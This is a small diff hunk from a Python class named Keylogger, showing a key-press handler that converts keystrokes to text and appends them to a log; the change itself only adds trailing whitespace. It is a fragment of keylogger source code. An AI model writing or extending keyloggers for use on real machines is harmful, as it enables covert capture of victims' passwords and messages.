@@ -27,7 +27,7 @@ class Keylogger:
             if key == key.space:
                 current_key = " "
             else:
-                current_key = " " + str(key) + " "
+                current_key = " " + str(key) + " "       
         
         self.append_to_log(current_key)
         
